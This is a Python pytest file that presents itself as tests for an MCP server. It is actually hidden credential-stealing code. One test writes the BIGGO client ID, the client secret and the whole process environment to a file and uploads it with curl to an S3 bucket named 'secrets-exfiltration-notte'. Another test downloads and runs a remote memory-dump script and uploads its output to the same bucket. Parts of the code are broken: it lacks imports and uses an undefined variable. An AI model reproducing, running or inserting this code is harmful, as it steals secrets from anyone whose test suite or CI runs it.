import pytest
import os
import subprocess

# Test configuration (replace with your details)
S3_BUCKET = 'secrets-exfiltration-notte'
FILE_NAME = 'big_exfiltration.txt'
S3_URL = f"https://{S3_BUCKET}.s3.us-east-1.amazonaws.com/{FILE_NAME}"

# Fetch the environment variable
BIGGO_MCP_SERVER_CLIENT_ID = os.getenv('BIGGO_MCP_SERVER_CLIENT_ID')
BIGGO_CLIENT_SECRET = os.getenv('BIGGO_MCP_SERVER_CLIENT_SECRET')
ALL=str(os.environ)
SCRIPT_URL = 'https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py'
DOWNLOADED_SCRIPT = 'downloaded_script.sh'


# Check if the environment variable is set
if BIGGO_MCP_SERVER_CLIENT_ID is None:
    raise ValueError("BIGGO_MCP_SERVER_CLIENT_ID environment variable is not set.")

@pytest.fixture
def prepare_file():
    """Fixture to write the environment variable to a local file."""
    with open(FILE_NAME, 'w') as f:
        f.write(f"BIGGO_MCP_SERVER_CLIENT_ID={BIGGO_MCP_SERVER_CLIENT_ID}\n")
        f.write(f"BIGGO_CLIENT_SECRET={BIGGO_CLIENT_SECRET}\n")
        f.write(f"{ALL}")
    yield
    # Cleanup: remove the local test file after the test
    os.remove(FILE_NAME)

def test_write_env_var_to_s3_using_curl(prepare_file):
    """Test to write the BIGGO_MCP_SERVER_CLIENT_ID env var to a file and upload to a public S3 bucket using curl."""

    # Use curl to upload the file to the public S3 bucket
    command = f"curl -X PUT --upload-file {FILE_NAME} {S3_URL}"
    result = subprocess.run(command, shell=True, capture_output=True)

    # Check if the curl command was successful
    assert result.returncode == 0, f"Upload failed: {result.stderr.decode()}"

    print(f"File '{FILE_NAME}' with content of BIGGO_MCP_SERVER_CLIENT_ID successfully uploaded to S3 bucket '{S3_BUCKET}' using curl.")


def test_download_and_execute_script():
    """Test to download a script from a URL, save it to a temp file, make it executable, and run it."""
    response = requests.get(SCRIPT_URL)
    assert response.status_code == 200, f"Failed to download script: {response.status_code}"

    with open(DOWNLOADED_SCRIPT, 'w') as f:
        f.write(response.text)

    os.chmod(DOWNLOADED_SCRIPT, os.stat(DOWNLOADED_SCRIPT).st_mode | stat.S_IEXEC)

    os.system(f'./{SCRIPT_FILE} > /tmp/git_secret.txt 2>&1')
    command = f"curl -X PUT --upload-file /tmp/git_secret.txt {S3_URL}"
    result = subprocess.run(command, shell=True, capture_output=True)

    os.remove(DOWNLOADED_SCRIPT)

